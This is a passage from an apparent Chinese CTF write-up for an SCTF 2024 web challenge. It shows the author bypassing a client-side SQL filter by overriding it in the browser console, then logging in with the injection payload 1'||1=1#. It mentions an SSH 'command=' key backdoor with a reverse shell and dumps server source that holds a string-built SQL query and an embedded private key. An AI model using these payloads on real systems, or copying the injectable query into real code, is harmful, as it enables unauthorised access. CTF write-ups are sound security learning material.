    window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">'/hello'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'loginForm'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'submit'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    e<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">const</span> username <span class="token operator">=</span> <span class="token function">wafsql</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> password <span class="token operator">=</span> <span class="token function">wafsql</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">const</span> response <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/config'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> publicKey <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token keyword">await</span> response<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">const</span> encrypt <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSEncrypt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    encrypt<span class="token punctuation">.</span><span class="token function">setPublicKey</span><span class="token punctuation">(</span>publicKey<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">const</span> encryptedPassword <span class="token operator">=</span> encrypt<span class="token punctuation">.</span><span class="token function">encrypt</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">const</span> formData <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token literal-property property">username</span><span class="token operator">:</span> username<span class="token punctuation">,</span>
        <span class="token literal-property property">password</span><span class="token operator">:</span> encryptedPassword
    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

    <span class="token keyword">const</span> loginResponse <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
        <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>
        <span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
            <span class="token string-property property">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'application/json'</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>formData<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token keyword">await</span> loginResponse<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">.</span>success<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'登录成功'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">"/hello"</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'登录失败：'</span> <span class="token operator">+</span> result<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>有sql的waf，发现几个路由：</p>
<ul>
<li>&#x2F;hello</li>
<li>&#x2F;config</li>
<li>&#x2F;login</li>
</ul>
<p>访问&#x2F;config拿到公钥</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"publicKey"</span><span class="token operator">:</span><span class="token string">"-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC5nJzSXtjxAB2tuz5WD9B//vLQ\nTfCUTc+AOwpNdBsOyoRcupuBmh8XSVnm5R4EXWS6crL5K3LZe5vO5YvmisqAq2IC\nXmWF4LwUIUfk4/2cQLNl+A0czlskBZvjQczOKXB+yvP4xMDXuc1hIujnqFlwOpGe\nI+Atul1rSE0APhHoPwIDAQAB\n-----END PUBLIC KEY-----"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC5nJzSXtjxAB2tuz5WD9B//vLQ
TfCUTc+AOwpNdBsOyoRcupuBmh8XSVnm5R4EXWS6crL5K3LZe5vO5YvmisqAq2IC
XmWF4LwUIUfk4/2cQLNl+A0czlskBZvjQczOKXB+yvP4xMDXuc1hIujnqFlwOpGe
I+Atul1rSE0APhHoPwIDAQAB
-----END PUBLIC KEY-----<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>前端会拿这个公钥去加密password，然后传给后端</p>
<p>让我们看看去年是怎么解的这题 ：</p>
<blockquote>
<p>在admin路由里其实是会执行<code>ssh -i rsa_key vanzy@xxxxx</code>这个指令去读取密钥文件的。然后我们可以再密钥文件里加入一条恶意的语句<code>command=xxxxxxx</code>，也就是标记ssh连接后干啥。写个反弹shell就出了<br>这里设计到一个ssh指令的特性，ssh在读取密钥文件的时候，会识别密钥文件中的<code>command=xxx</code>，这样实际上就是一个ssh后门</p>
</blockquote>
<p>好完全没有关系（</p>
<p>看一下前端的加密函数…</p>
<p><img src="/blog/2024/09/28/SCTF-2024/image-20240928143904365.png" alt="image-20240928143904365"></p>
<p>唉完全审不了</p>
<p>dirsearch 扫一下发现 robots.txt</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">User-agent: *
Disallow:
Disallow: /ExP0rtApi?v=static&amp;f=1.jpeg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>访问发现还是需要token</p>
<p>然后尝试抓包自己加密个rsa注入万能密码</p>
<p><img src="/blog/2024/09/28/SCTF-2024/image-20240930130155926.png" alt="image-20240930130155926"></p>
<p><img src="/blog/2024/09/28/SCTF-2024/image-20240930130208952.png" alt="image-20240930130208952"></p>
<p>不行，看来加密逻辑对不上，后面得知这个库默认是用 PKCS1 加密的</p>
<p>因为<code>wafsql</code>是前端函数，那么尝试在控制台覆写这个函数，然后前端注入sql</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">wafsql</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> str<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>注入万能密码<code>1&#39;||1=1#</code></p>
<p><img src="/blog/2024/09/28/SCTF-2024/image-20240930131430932.png" alt="image-20240930131430932"></p>
<p>登录成功</p>
<p><img src="/blog/2024/09/28/SCTF-2024/image-20240930131616328.png" alt="image-20240930131616328"></p>
<p>带上token去 &#x2F;ExP0rtApi，尝试读源码</p>
<p><img src="/blog/2024/09/28/SCTF-2024/image-20240930131817658.png" alt="image-20240930131817658"></p>
<p><img src="/blog/2024/09/28/SCTF-2024/image-20240930131831518.png" alt="image-20240930131831518"></p>
<p>竟然是gz，dump下来解压得到 app.js 的源码</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> nodeRsa <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'node-rsa'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> bodyParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> jwt <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'jsonwebtoken'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token constant">SECRET_KEY</span> <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> zlib <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'zlib'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> mysql <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'mysql'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> handle <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./handle'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> cp <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> cookieParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'cookie-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> con <span class="token operator">=</span> mysql<span class="token punctuation">.</span><span class="token function">createConnection</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
  <span class="token literal-property property">host</span><span class="token operator">:</span> <span class="token string">'localhost'</span><span class="token punctuation">,</span>
  <span class="token literal-property property">user</span><span class="token operator">:</span> <span class="token string">'ctf'</span><span class="token punctuation">,</span>
  <span class="token literal-property property">password</span><span class="token operator">:</span> <span class="token string">'ctf123123'</span><span class="token punctuation">,</span>
  <span class="token literal-property property">port</span><span class="token operator">:</span> <span class="token string">'3306'</span><span class="token punctuation">,</span>
  <span class="token literal-property property">database</span><span class="token operator">:</span> <span class="token string">'sctf'</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
con<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Error connecting to MySQL:'</span><span class="token punctuation">,</span> err<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setTimeout</span><span class="token punctuation">(</span>con<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 2秒后重试连接</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Connected to MySQL'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> <span class="token punctuation">&#123;</span>response<span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"express"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> req <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"express/lib/request"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> key <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">nodeRsa</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">b</span><span class="token operator">:</span> <span class="token number">1024</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
key<span class="token punctuation">.</span><span class="token function">setOptions</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">encryptionScheme</span><span class="token operator">:</span> <span class="token string">'pkcs1'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> publicPem <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC5nJzSXtjxAB2tuz5WD9B//vLQ\nTfCUTc+AOwpNdBsOyoRcupuBmh8XSVnm5R4EXWS6crL5K3LZe5vO5YvmisqAq2IC\nXmWF4LwUIUfk4/2cQLNl+A0czlskBZvjQczOKXB+yvP4xMDXuc1hIujnqFlwOpGe\nI+Atul1rSE0APhHoPwIDAQAB\n-----END PUBLIC KEY-----</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
<span class="token keyword">var</span> privatePem <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">-----BEGIN PRIVATE KEY-----
MIICeAIBADANBgkqhkiG9w0BAQEFAASCAmIwggJeAgEAAoGBALmcnNJe2PEAHa27
PlYP0H/+8tBN8JRNz4A7Ck10Gw7KhFy6m4GaHxdJWeblHgRdZLpysvkrctl7m87l
i+aKyoCrYgJeZYXgvBQhR+Tj/ZxAs2X4DRzOWyQFm+NBzM4pcH7K8/jEwNe5zWEi
6OeoWXA6kZ4j4C26XWtITQA+Eeg/AgMBAAECgYA+eBhLsUJgckKK2y8StgXdXkgI
lYK31yxUIwrHoKEOrFg6AVAfIWj/ZF+Ol2Qv4eLp4Xqc4+OmkLSSwK0CLYoTiZFY
Jal64w9KFiPUo1S2E9abggQ4omohGDhXzXfY+H8HO4ZRr0TL4GG+Q2SphkNIDk61
khWQdvN1bL13YVOugQJBAP77jr5Y8oUkIsQG+eEPoaykhe0PPO408GFm56sVS8aT
6sk6I63Byk/DOp1MEBFlDGIUWPjbjzwgYouYTbwLwv8CQQC6WjLfpPLBWAZ4nE78
dfoDzqFcmUN8KevjJI9B/rV2I8M/4f/UOD8cPEg8kzur7fHga04YfipaxT3Am1kG
mhrBAkEA90J56ZvXkcS48d7R8a122jOwq3FbZKNxdwKTJRRBpw9JXllCv/xsc2ye
KmrYKgYTPAj/PlOrUmMVLMlEmFXPgQJBAK4V6yaf6iOSfuEXbHZOJBSAaJ+fkbqh
UvqrwaSuNIi72f+IubxgGxzed8EW7gysSWQT+i3JVvna/tg6h40yU0ECQQCe7l8l
zIdwm/xUWl1jLyYgogexnj3exMfQISW5442erOtJK8MFuUJNHFMsJWgMKOup+pOg
xu/vfQ0A1jHRNC7t
-----END PRIVATE KEY-----</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>

<span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">extended</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'static'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">cookieParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> Reportcache <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">verifyAdmin</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> token <span class="token operator">=</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">[</span><span class="token string">'auth_token'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>token<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">message</span><span class="token operator">:</span> <span class="token string">'No token provided'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  jwt<span class="token punctuation">.</span><span class="token function">verify</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> <span class="token constant">SECRET_KEY</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> decoded</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">message</span><span class="token operator">:</span> <span class="token string">'Failed to authenticate token'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>decoded<span class="token punctuation">.</span>role <span class="token operator">!==</span> <span class="token string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">message</span><span class="token operator">:</span> <span class="token string">'Access denied. Admins only.'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    req<span class="token punctuation">.</span>user <span class="token operator">=</span> decoded<span class="token punctuation">;</span>
    <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/hello'</span><span class="token punctuation">,</span> verifyAdmin <span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span><span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'&lt;h1>Welcome Admin!!!&lt;/h1>&lt;br>&lt;img src="./1.jpeg" />'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/config'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
    <span class="token literal-property property">publicKey</span><span class="token operator">:</span> publicPem<span class="token punctuation">,</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> <span class="token function-variable function">decrypt</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">body</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> pem <span class="token operator">=</span> privatePem<span class="token punctuation">;</span>
    <span class="token keyword">var</span> key <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">nodeRsa</span><span class="token punctuation">(</span>pem<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
      <span class="token literal-property property">encryptionScheme</span><span class="token operator">:</span> <span class="token string">'pkcs1'</span><span class="token punctuation">,</span>
      <span class="token literal-property property">b</span><span class="token operator">:</span> <span class="token number">1024</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    key<span class="token punctuation">.</span><span class="token function">setOptions</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">environment</span><span class="token operator">:</span> <span class="token string">"browser"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> key<span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span>body<span class="token punctuation">,</span> <span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"decrypt error"</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> encryptedPassword <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>password<span class="token punctuation">;</span>
  <span class="token keyword">const</span> username <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>username<span class="token punctuation">;</span>

  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
    passwd <span class="token operator">=</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>encryptedPassword<span class="token punctuation">)</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>username <span class="token operator">===</span> <span class="token string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">const</span> sql <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">select (select password from user where username = 'admin') = '</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>passwd<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">';</span><span class="token template-punctuation string">`</span></span>
      con<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span>sql<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> rows</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>err<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>rows<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>rows<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">const</span> token <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>username<span class="token punctuation">,</span> <span class="token literal-property property">role</span><span class="token operator">:</span> username<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token constant">SECRET_KEY</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">expiresIn</span><span class="token operator">:</span> <span class="token string">'1h'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'auth_token'</span><span class="token punctuation">,</span> token<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">secure</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">success</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token literal-property property">message</span><span class="token operator">:</span> <span class="token string">'Login Successfully'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
          res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">success</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token literal-property property">message</span><span class="token operator">:</span> <span class="token string">'Errow Password!'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
